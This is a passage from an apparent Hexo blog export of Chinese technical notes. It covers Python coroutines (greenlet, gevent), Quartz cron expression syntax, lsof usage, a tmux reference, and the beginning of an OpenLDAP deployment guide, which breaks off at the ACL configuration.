有个函数，这个函数就是操作的Foo函数的返回值！</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>首先要明确，线程和进程都是系统帮咱们开辟的，不管是thread还是process他内部都是调用的系统的API<br>而对于协程来说它和系统毫无关系！<br>他就和程序员有关系，对于线程和进程来说，调度是由CPU来决定调度的！<br>对于协程来说，程序员就是上帝，你想让谁执行到哪里他就执行到哪里</p>
<p>协程存在的意义：对于多线程应用，CPU通过切片的方式来切换线程间的执行，线程切换时需要耗时（保存状态，下次继续）。协程，则只使用一个线程，在一个线程中规定某个代码块执行顺序。</p>
<p>适用场景：其实在其他语言中，协程的其实是意义不大的多线程即可已解决I/O的问题，但是在python因为他有GIL（Global Interpreter Lock 全局解释器锁 ）在同一时间只有一个线程在工作，所以：如果一个线程里面I/O操作特别多，协程就比较适用</p>
<p><strong>greenlet</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">收先要明确，线程和进程都是系统帮咱们开辟的，不管是thread还是process他内部都是调用的系统的API</span><br><span class="line">而对于协程来说它和系统毫无关系！</span><br><span class="line">他就和程序员有关系，对于线程和进程来说，是不是有CPU来决定调度的！</span><br><span class="line">对于协程来说，程序员就是上帝，你想让谁执行到哪里他就执行到哪里</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> greenlet <span class="keyword">import</span> greenlet</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="number">12</span></span><br><span class="line">    gr2.switch()<span class="comment">#切换到协程2执行</span></span><br><span class="line">    <span class="keyword">print</span> <span class="number">34</span> <span class="comment">#2切回来之后，在这里和yield类似</span></span><br><span class="line">    gr2.switch() </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="number">56</span></span><br><span class="line">    gr1.switch()<span class="comment">#上面执行了一句，在切换到协程1里去了</span></span><br><span class="line">    <span class="keyword">print</span> <span class="number">78</span></span><br><span class="line"> </span><br><span class="line">gr1 = greenlet(test1) <span class="comment">#创建了一个协程</span></span><br><span class="line">gr2 = greenlet(test2)</span><br><span class="line"></span><br><span class="line">gr1.switch() <span class="comment">#执行test1 </span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">比I/O操作，如果10个I/O，我程序从上往下执行，如果同时发出去了10个I/O操作，那么返回的结果如果同时回来了2个</span></span><br><span class="line"><span class="string">，是不是就节省了很多时间？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果一个线程里面I/O操作特别多，使用协程是不是就非常适用了！</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果一个线程访问URL通过协程来做，协程告诉它你去请求吧，然后继续执行，但是如果不用协程就得等待第一个请求完毕之后返回之后才</span></span><br><span class="line"><span class="string">继续下一个请求。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">协程：把一个线程分成了多个协程操作，每个协程做操作</span></span><br><span class="line"><span class="string">多线程：是把每一个操作，分为多个线程做操作，但是python中，在同一时刻只能有一个线程操作，并且有上下文切换。但是如果上下文切换非常频繁的话</span></span><br><span class="line"><span class="string">是非常耗时的，但对于协程切换就非常轻便了~</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<p>协程就是对线程的分片，上面的例子需要手动操作可能用处不是很大了解原理，看下面的例子：</p>
<p>上面的<strong>greenlet</strong>是需要认为的制定调度顺序的，所以又出了一个<strong>gevent</strong>他是对greenlet功能进行封装</p>
<p> 遇到I/O自动切换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey; monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">'GET: %s'</span> % url)</span><br><span class="line">    resp = urllib2.urlopen(url) <span class="comment">#当遇到I/O操作的时候就会调用协程操作，然后继续往下走，然后这个协程就卡在这里等待数据的返回</span></span><br><span class="line">    data = resp.read()</span><br><span class="line">    print(<span class="string">'%d bytes received from %s.'</span> % (len(data), url))</span><br><span class="line"></span><br><span class="line">gevent.joinall([</span><br><span class="line">        gevent.spawn(f, <span class="string">'https://www.python.org/'</span>),  <span class="comment">#这里的f是调用这个方法，第二个是调用方的参数</span></span><br><span class="line">        gevent.spawn(f, <span class="string">'https://www.yahoo.com/'</span>),</span><br><span class="line">        gevent.spawn(f, <span class="string">'https://github.com/'</span>),</span><br><span class="line">]) </span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">gevent.spawn(f, 'https://www.python.org/'),  #这里的f是调用这个方法，第二个是调用方的参数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">当函数f里的代码遇到I/O操作的时候，函数就卡在哪里等待数据的返回，但是协程不会等待而是继续操作!</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程积累</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Java定时器设定详解</title>
    <url>/articles/d0e68aab.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>本文通过实例详细介绍了Java定时和linux通用的crontab之间的差异。</p>
<a id="more"></a>

<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>这些星号由左到右按顺序代表 ： * * * * * * *</p>
<p>格式: [秒] [分] [小时] [日] [月] [周] [年]</p>
<p>序号说明是否必填 允许填写的值 允许的通配符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 秒 是 0-59 , - * /</span><br><span class="line"></span><br><span class="line">2 分 是 0-59 , - * /</span><br><span class="line"></span><br><span class="line">3 小时 是 0-23 , - * /</span><br><span class="line"></span><br><span class="line">4 日 是 1-31 , - * ? / L W</span><br><span class="line"></span><br><span class="line">5 月 是 1-12 or JAN-DEC , - * /</span><br><span class="line"></span><br><span class="line">6 周 是 1-7 or SUN-SAT , - * ? / L #</span><br><span class="line"></span><br><span class="line">7 年 否 empty 或 1970-2099 , - * /</span><br></pre></td></tr></table></figure>

<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* 表示所有值. 例如:在分的字段上设置 "*",表示每一分钟都会触发。</span><br><span class="line"></span><br><span class="line">? 表示不指定值。使用的场景为不需要关心当前设置这个字段的值。例如:要在每月的10号触发一个操作，但不关心是周几，所以需要周位置的那个字段设置为"?" 具体设置为 0 0 0 10 * ?</span><br><span class="line"></span><br><span class="line">- 表示区间。例如 在小时上设置 "10-12",表示 10,11,12点都会触发。</span><br><span class="line"></span><br><span class="line">, 表示指定多个值，例如在周字段上设置 "MON,WED,FRI" 表示周一，周三和周五触发</span><br><span class="line"></span><br><span class="line">/ 用于递增触发。如在秒上面设置"5/15" 表示从5秒开始，每增15秒触发(5,20,35,50)。在月字段上设置'1/3'所示每月1号开始，每隔三天触发一次。一般不写的话，默认递增为基本单位，如1分钟，1秒钟</span><br><span class="line"></span><br><span class="line">L 表示最后的意思。在日字段设置上，表示当月的最后一天(依据当前月份，如果是二月还会依据是否是润年[leap]), 在周字段上表示星期六，相当于"7"或"SAT"。如果在"L"前加上数字，则表示该数据的最后一个。例如在周字段上设置"6L"这样的格式,则表示“本月最后一个星期五"</span><br><span class="line"></span><br><span class="line">W 表示离指定日期的最近那个工作日(周一至周五). 例如在日字段上设置"15W"，表示离每月15号最近的那个工作日触发。如果15号正好是周六，则找最近的周五(14号)触发, 如果15号是周未，则找最近的下周一(16号)触发.如果15号正好在工作日(周一至周五)，则就在该天触发。如果指定格式为 "1W",它则表示每月1号往后最近的工作日触发。如果1号正是周六，则将在3号下周一触发。(注，"W"前只能设置具体的数字,不允许区间"-").</span><br><span class="line"></span><br><span class="line">小提示</span><br><span class="line">'L'和 'W'可以一组合使用。如果在日字段上设置"LW",则表示在本月的最后一个工作日触发(一般指发工资 )</span><br><span class="line"></span><br><span class="line">\# 序号(表示每月的第几个周几)，例如在周字段上设置"6#3"表示在每月的第三个周六.注意如果指定"#5",正好第五周没有周六，则不会触发该配置(用在母亲节和父亲节再合适不过了)</span><br><span class="line"></span><br><span class="line">小提示</span><br><span class="line"></span><br><span class="line">周字段的设置，若使用英文字母是不区分大小写的 MON 与mon相同.</span><br></pre></td></tr></table></figure>

<h2 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 0 12 * * ? 每天12点触发</span><br><span class="line"></span><br><span class="line">0 15 10 ? * * 每天10点15分触发</span><br><span class="line"></span><br><span class="line">0 15 10 * * ? 每天10点15分触发</span><br><span class="line"></span><br><span class="line">0 15 10 * * ? * 每天10点15分触发</span><br><span class="line"></span><br><span class="line">0 15 10 * * ? 2005 2005年每天10点15分触发</span><br><span class="line"></span><br><span class="line">0 * 14 * * ? 每天下午的 2点到2点59分每分触发</span><br><span class="line"></span><br><span class="line">0 0/5 14 * * ? 每天下午的 2点到2点59分(整点开始，每隔5分触发)</span><br><span class="line"></span><br><span class="line">0 0/5 14,18 * * ? 每天下午的 2点到2点59分(整点开始，每隔5分触发)以及每天下午的 18点到18点59分(整点开始，每隔5分触发)</span><br><span class="line"></span><br><span class="line">0 0-5 14 * * ? 每天下午的 2点到2点05分每分触发</span><br><span class="line"></span><br><span class="line">0 10,44 14 ? 3 WED 3月分每周三下午的 2点10分和2点44分触发 （特殊情况，在一个时间设置里，执行两次或 两次以上的情况）</span><br><span class="line"></span><br><span class="line">0 59 2 ? * FRI 每周5凌晨2点59分触发；</span><br><span class="line"></span><br><span class="line">0 15 10 ? * MON-FRI 从周一到周五每天上午的10点15分触发</span><br><span class="line"></span><br><span class="line">0 15 10 15 * ? 每月15号上午10点15分触发</span><br><span class="line"></span><br><span class="line">0 15 10 L * ? 每月最后一天的10点15分触发</span><br><span class="line"></span><br><span class="line">0 15 10 ? * 6L 每月最后一周的星期五的10点15分触发</span><br><span class="line"></span><br><span class="line">0 15 10 ? * 6L 2002-2005 从2002年到2005年每月最后一周的星期五的10点15分触发</span><br><span class="line"></span><br><span class="line">0 15 10 ? * 6#3 每月的第三周的星期五开始触发</span><br><span class="line"></span><br><span class="line">0 0 12 1/5 * ? 每月的第一个中午开始每隔5天触发一次</span><br><span class="line"></span><br><span class="line">0 11 11 11 11 ? 每年的11月11号 11点11分触发(光棍节)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>运维技术</category>
        <category>命令详解</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>lsof文件句柄工具</title>
    <url>/articles/6915627d.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在linux环境下，一切皆文件，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件，如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，文件描述符提供了大量关于这个应用程序本身的信息。</p>
<h2 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> -a 列出被打开的文件的进程列表</span><br><span class="line">-c&lt;进程名&gt; 列出指定进程所打开的文件</span><br><span class="line">-g 列出GID号进程详情</span><br><span class="line">-d&lt;文件号&gt; 列出占用该文件号的进程</span><br><span class="line">+d&lt;目录&gt; 列出目录下被打开的文件</span><br><span class="line">+D&lt;目录&gt; 递归列出目录下被打开的文件</span><br><span class="line">-n&lt;目录&gt; 列出使用NFS的文件</span><br><span class="line">-i&lt;条件&gt; 列出符合条件的进程。（4、6、协议、:端口、 @ip ）</span><br><span class="line">-p&lt;进程号&gt; 列出指定进程号所打开的文件</span><br><span class="line">-u 列出UID号进程详情</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h4 id="文件被哪些进程打开了"><a href="#文件被哪些进程打开了" class="headerlink" title="文件被哪些进程打开了"></a>文件被哪些进程打开了</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> root@lzjun:~# lsof -a /var/lib/mysql/mysql/slow_log.CSV</span><br><span class="line">COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">mysqld  29363 mysql   63r   REG  253,1        0 263979 /var/lib/mysql/mysql/slow_log.CSV</span><br></pre></td></tr></table></figure>

<h4 id="列出用户打开的文件"><a href="#列出用户打开的文件" class="headerlink" title="列出用户打开的文件"></a>列出用户打开的文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> root@lzjun:~# lsof -u root | more</span><br><span class="line">COMMAND     PID USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME</span><br><span class="line">init          1 root  cwd       DIR              253,1     4096          2 /</span><br><span class="line">init          1 root  rtd       DIR              253,1     4096          2 /</span><br><span class="line">init          1 root  txt       REG              253,1   167192    1048737 /sbin/init</span><br></pre></td></tr></table></figure>

<h4 id="列出程序（command）打开了哪些文件"><a href="#列出程序（command）打开了哪些文件" class="headerlink" title="列出程序（command）打开了哪些文件"></a>列出程序（command）打开了哪些文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> root@lzjun:~# lsof -c python</span><br><span class="line">COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">python  32280 root  rtd    DIR  253,1     4096      2 /</span><br><span class="line">python  32280 root  mem    REG  253,1    52120 927846 /lib/x86_64-linux-gnu/libnss_files-2.15.so</span><br><span class="line">python  32280 root  DEL    REG  253,1          263953 /usr/lib/python2.7/lib-dynload/_multiprocessing.so</span><br></pre></td></tr></table></figure>

<h4 id="根据进程号列出该进程打开的文件"><a href="#根据进程号列出该进程打开的文件" class="headerlink" title="根据进程号列出该进程打开的文件"></a>根据进程号列出该进程打开的文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> root@lzjun:~# lsof -p 31370  #nginx的进程号</span><br><span class="line">COMMAND   PID     USER   FD   TYPE             DEVICE SIZE/OFF    NODE NAME</span><br><span class="line">nginx   31370 www-data  cwd    DIR              253,1     4096       2 /</span><br><span class="line">nginx   31370 www-data  rtd    DIR              253,1     4096       2 /</span><br><span class="line">nginx   31370 www-data  txt    REG              253,1   843688 1186644 /usr/sbin/nginx</span><br></pre></td></tr></table></figure>

<h4 id="查看所有网络连接，包括tcp，udp，ipv4-ipv6的连接（网络连接也是文件）"><a href="#查看所有网络连接，包括tcp，udp，ipv4-ipv6的连接（网络连接也是文件）" class="headerlink" title="查看所有网络连接，包括tcp，udp，ipv4,ipv6的连接（网络连接也是文件）"></a>查看所有网络连接，包括tcp，udp，ipv4,ipv6的连接（网络连接也是文件）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> root@lzjun:~# lsof -i</span><br><span class="line">COMMAND    PID     USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME</span><br><span class="line">pptpd      975     root    6u  IPv4     8836      0t0  TCP *:1723 (LISTEN)</span><br><span class="line">ssserver  7366     root    4u  IPv4   100096      0t0  TCP *:8388 (LISTEN)</span><br><span class="line">ssserver  7366     root    5u  IPv4   100097      0t0  UDP *:8388</span><br><span class="line">ssserver  7366     root    7u  IPv4   100098      0t0  UDP *:57935</span><br></pre></td></tr></table></figure>

<h4 id="查看某个端口打开的文件（socket-连接）"><a href="#查看某个端口打开的文件（socket-连接）" class="headerlink" title="查看某个端口打开的文件（socket 连接）"></a>查看某个端口打开的文件（socket 连接）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> root@lzjun:~# lsof -i :80</span><br><span class="line">COMMAND   PID     USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME</span><br><span class="line">nginx   31369     root    6u  IPv4 8882096      0t0  TCP *:http (LISTEN)</span><br></pre></td></tr></table></figure>

<h4 id="查看所有TCP连接"><a href="#查看所有TCP连接" class="headerlink" title="查看所有TCP连接"></a>查看所有TCP连接</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -n -P -i TCP -s TCP:LISTEN</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>运维技术</category>
        <category>命令详解</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>tmux参考手册</title>
    <url>/articles/a5e32f5.html</url>
    <content><![CDATA[<h2 id="tmux是什么"><a href="#tmux是什么" class="headerlink" title="tmux是什么"></a>tmux是什么</h2><p>tmux（terminal multiplexer）是Linux上的终端复用神器，可从一个屏幕上管理多个终端（准确说是伪终端）。使用该工具，用户可以连接或断开会话，而保持终端在后台运行。类似的工具还有screen，个人对这二者的使用感受是，用过tmux就再也不想用screen了。</p>
<h2 id="tmux基本结构"><a href="#tmux基本结构" class="headerlink" title="tmux基本结构"></a>tmux基本结构</h2><p>tmux的结构包括<strong>会话</strong>(session)、<strong>窗口</strong>(window)、<strong>窗格</strong>(pane)三部分，会话实质是伪终端的集合，每个窗格表示一个伪终端，多个窗格展现在一个屏幕上，这一屏幕就叫窗口。基本结构及状态信息如下图所示：</p>
<p><img src="/articles/a5e32f5/1.png" alt></p>
<a id="more"></a>

<h2 id="tmux基本操作"><a href="#tmux基本操作" class="headerlink" title="tmux基本操作"></a>tmux基本操作</h2><p>基本的操作无非就是对会话、窗口、窗格进行管理，包括创建、关闭、重命名、连接、分离、选择等等。</p>
<p>一般使用命令和快捷键进行操作，可在系统shell终端和tmux命令模式（类似vim的命令模式）下使用命令，或者在tmux终端使用快捷键。</p>
<p>tmux默认的快捷键前缀是<strong>Ctrl+b</strong>(下文用<strong>prefix</strong>指代)，按下前缀组合键后松开，再按下命令键进行快捷操作，比如使用<strong>prefix d</strong>分离会话（应该写作<strong>prefix d</strong>而不是<strong>prefix+d，</strong>因为<strong>d</strong>键不需要与<strong>prefix</strong>同时按下）。</p>
<p>快捷键可以自定义，比如将前缀改为<strong>Ctrl+a</strong>，但需要保留shell默认的<strong>Ctrl+a</strong>快捷键，按如下所示修改~/.tmux.conf文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set-option -g prefix C-a</span><br><span class="line">unbind-key C-b</span><br><span class="line">bind-key C-a send-prefix</span><br><span class="line">bind-key R source-file ~/.tmux.conf \; display-message &quot;~/.tmux.conf reloaded.&quot;</span><br></pre></td></tr></table></figure>

<p>现在已将原先的<strong>Ctrl+a</strong>用<strong>prefix Ctrl+a</strong>取代，即需要按两次<strong>Ctrl+a</strong>生效。</p>
<p>第4行的作用是使用<strong>prefix r</strong>重新加载配置文件，并输出提示，否则需要关闭会话后配置文件才能生效，也可手动加载配置文件，在tmux终端输入”<strong>prefix :”</strong>进入命令模式，用<strong>source-file</strong>命令加载配置文件。</p>
<p><strong>注意，将多个命令写在一起作为命令序列时，命令之间要用空格和分号分隔。</strong></p>
<h4 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h4><p><strong>常用命令</strong></p>
<p><strong>tmux new</strong>　　创建默认名称的会话（在tmux命令模式使用<strong>new</strong>命令可实现同样的功能，其他命令同理，后文不再列出tmux终端命令）</p>
<p><strong>tmux new -s mysession</strong>　　创建名为mysession的会话</p>
<p><strong>tmux ls</strong>　　显示会话列表</p>
<p><strong>tmux a</strong>　　连接上一个会话</p>
<p><strong>tmux a -t mysession</strong>　　连接指定会话</p>
<p><strong>tmux rename -t s1 s2</strong>　　重命名会话s1为s2</p>
<p><strong>tmux kill-session</strong>　　关闭上次打开的会话</p>
<p><strong>tmux kill-session -t s1</strong>　　关闭会话s1</p>
<p><strong>tmux kill-session -a -t s1</strong>　　关闭除s1外的所有会话</p>
<p><strong>tmux kill-server</strong>　　关闭所有会话</p>
<p><strong>常用快捷键</strong></p>
<p><strong>prefix s</strong>　　列出会话，可进行切换</p>
<p><strong>prefix $</strong>　　重命名会话</p>
<p><strong>prefix d</strong>　　分离当前会话</p>
<p><strong>prefix</strong> <strong>D</strong>　　分离指定会话</p>
<p>　　</p>
<h4 id="窗口管理"><a href="#窗口管理" class="headerlink" title="窗口管理"></a>窗口管理</h4><p><strong>prefix c</strong>　　创建一个新窗口</p>
<p><strong>prefix ,</strong>　　重命名当前窗口</p>
<p><strong>prefix w</strong>　　列出所有窗口，可进行切换</p>
<p><strong>prefix n</strong>　　进入下一个窗口</p>
<p><strong>prefix p</strong>　　进入上一个窗口</p>
<p><strong>prefix l</strong>　　进入之前操作的窗口</p>
<p><strong>prefix 0~9</strong>　　选择编号0~9对应的窗口</p>
<p><strong>prefix .</strong>　　修改当前窗口索引编号</p>
<p><strong>prefix ‘</strong>　　切换至指定编号（可大于9）的窗口</p>
<p><strong>prefix f</strong>　　根据显示的内容搜索窗格</p>
<p><strong>prefix &amp;</strong>　　关闭当前窗口</p>
<p>　</p>
<h4 id="窗格管理"><a href="#窗格管理" class="headerlink" title="窗格管理"></a><strong>窗格管理</strong></h4><p><strong>prefix %</strong>　　水平方向创建窗格</p>
<p><strong>prefix “</strong>　　垂直方向创建窗格</p>
<p><strong>prefix Up|Down|Left|Right</strong>　　根据箭头方向切换窗格</p>
<p><strong>prefix q</strong>　　显示窗格编号</p>
<p><strong>prefix o</strong>　　顺时针切换窗格</p>
<p><strong>prefix }</strong>　　与下一个窗格交换位置</p>
<p><strong>prefix {</strong>　　与上一个窗格交换位置</p>
<p><strong>prefix x</strong>　　关闭当前窗格</p>
<p><strong>prefix space(空格键)</strong>　　重新排列当前窗口下的所有窗格</p>
<p><strong>prefix !</strong>　　将当前窗格置于新窗口</p>
<p><strong>prefix Ctrl+o</strong>　　逆时针旋转当前窗口的窗格</p>
<p><strong>prefix t</strong>　　在当前窗格显示时间</p>
<p><strong>prefix z</strong>　　放大当前窗格(再次按下将还原)</p>
<p><strong>prefix i</strong>　　显示当前窗格信息</p>
<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a><strong>其他命令</strong></h4><p><strong>tmux list-key</strong>　　列出所有绑定的键，等同于<strong>prefix ?</strong></p>
<p><strong>tmux list-command</strong>　　列出所有命令</p>
<p>　　</p>
<p>以上为tmux的常见操作，基本可以满足大部分的工作需求，至于更高端的操作待日后再整理。</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>命令详解</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>LDAP部署和第三方服务接入</title>
    <url>/articles/543cefa7.html</url>
    <content><![CDATA[<h1 id="LDAP部署"><a href="#LDAP部署" class="headerlink" title="LDAP部署"></a>LDAP部署</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>可以通过以下三句话快速的认识一下LDAP：</p>
<ol>
<li>LDAP：Lightweight Directory Access Protocol，轻量目录访问协议。</li>
<li>LDAP服务是一个为只读（查询、浏览、搜索）访问而优化的非关系型数据库，呈树状结构组织数据。</li>
<li>LDAP主要用做用户信息查询（如邮箱、电话等）或对各种服务访问做后台认证以及用户数据权限管控。</li>
</ol>
<h4 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h4><ul>
<li>DC：domain component一般为公司名，例如：dc=163,dc=com</li>
<li>OU：organization unit为组织单元，最多可以有四级，每级最长32个字符，可以为中文</li>
<li>CN：common name为用户名或者服务器名，最长可以到80个字符，可以为中文</li>
<li>DN：distinguished name为一条LDAP记录项的名字，有唯一性，例如：dc:”cn=admin,ou=developer,dc=163,dc=com”</li>
</ul>
<h4 id="图形示例"><a href="#图形示例" class="headerlink" title="图形示例"></a>图形示例</h4><p>上边来了一堆的名词解释，看的云里雾里，还不是很明白，怎么跟自己的组织架构对应起来呢？看看下边的图是不是清晰明了</p>
<p><img src="/articles/543cefa7/1.png" alt="img"></p>
<a id="more"></a>

<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>部署环境：Debian 8.4</p>
<p>1.安装OpenLDAP,OpenLDAP服务端程序叫slapd</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> apt-get install -y slapd</span></span><br></pre></td></tr></table></figure>

<p>2.安装完成之后，会自动生成一个OpenLDAP的系统账号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /etc/passwd</span></span><br><span class="line">openldap:x:110:115:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false</span><br></pre></td></tr></table></figure>

<p>3.生成OpenLDAP管理员账号的密码（后边修改配置文件需要使用）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> slappasswd</span></span><br><span class="line">New password: </span><br><span class="line">Re-enter new password: </span><br><span class="line">&#123;SSHA&#125;EcAoXeGab5g8y2Y03EmH3+Zc3hJaHp7F</span><br></pre></td></tr></table></figure>

<p>4.新建OpenLDAP配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cp /usr/share/slapd/slapd.conf /etc/ldap/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置文件中有很多@xxx@的配置替换为真实配置</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> slaptest -f /etc/ldap/slapd.conf </span></span><br><span class="line">5ad9b19d /etc/ldap/slapd.conf: line 105: rootdn is always granted unlimited privileges.</span><br><span class="line">5ad9b19d /etc/ldap/slapd.conf: line 122: rootdn is always granted unlimited privileges.</span><br><span class="line">config file testing succeeded</span><br></pre></td></tr></table></figure>

<p>配置文件重要参数说明（需要自己修改的，其他未提到的可以不修改）：</p>
<ul>
<li><code>database bdb</code>：定义使用的后端数据存储格式，数据库默认采用了berkeley db，其后可以跟的值有bdb、ldbm、passwd、shell。bdb指使用Berkley DB 4数据库</li>
<li><code>suffix &quot;dc=163,dc=com&quot;</code>：suffix是”LDAP基准名”，它是LDAP名字空间在这里的根。设置想要创建的子树的根DN</li>
<li><code>rootdn &quot;cn=admin,dc=163,dc=com&quot;</code>：设置管理LDAP目录的超级用户的DN。这个用户名不要出现在/etc/passwd文件里</li>
<li><code>rootpw {SSHA}EcAoXeGab5g8y2Y03EmH3+Zc3hJaHp7F</code>：设置这个数据库的超级用户的口令验证方式。也就是上边rootdn设置的用户的密码。一定要用加密的口令存储，可以使用的加密方式有：CRYPT、MD5、SMD5、SHA和SSHA，<strong>就是我们第三步生成的密码</strong></li>
<li><code>directory /var/lib/ldap</code>：设置LDAP数据库和索引文件所在的目录</li>
<li><code>access to</code>：权限配置下边详细说明</li>
</ul>
<p>5.删除原配置，生成新配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> rm -rf /etc/ldap/slapd.d/*</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> slaptest -f /etc/ldap/slapd.conf -F /etc/ldap/slapd.d/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 给新生成的配置文件赋予OpenLdap的权限</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chown -R openldap.openldap /etc/ldap/slapd.d/</span></span><br></pre></td></tr></table></figure>

<p>6.重启OpenLdap</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/slapd restart</span></span><br></pre></td></tr></table></figure>

<h2 id="ACL权限控制"><a href="#ACL权限控制" class="headerlink" title="ACL权限控制"></a>ACL权限控制</h2><p>ACL访问指令的格式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">access to [what]</span><br><span class="line">    by [who] [control]</span><br></pre></td></tr></table></figure>

<p>简单解释：通过access to约束我们访问的范围（what），通过by设定哪个用户（who）有什么权限（control）</p>
<p>ACL的详细配置还是比较复杂的，可以看下下边参考文档的第三篇，写的比较详细，这里都不再赘述。</p>
<h3 id="线上ACL控制配置解析"><a href="#线上ACL控制配置解析" class="headerlink" title="线上ACL控制配置解析"></a>线上ACL控制配置解析</h3><p>为了用户能够自主修改密码，部署了lam给用户使用（见下文lam介绍）。希望能达到的效果是：</p>
<ol>
<li>管理员能够有全部权限，包含新建用户，修改用户属性，充值用户密码等</li>
<li>普通用户只能修改自己的密码，别的权限都没有</li>
</ol>
<p>配置如下：</p>
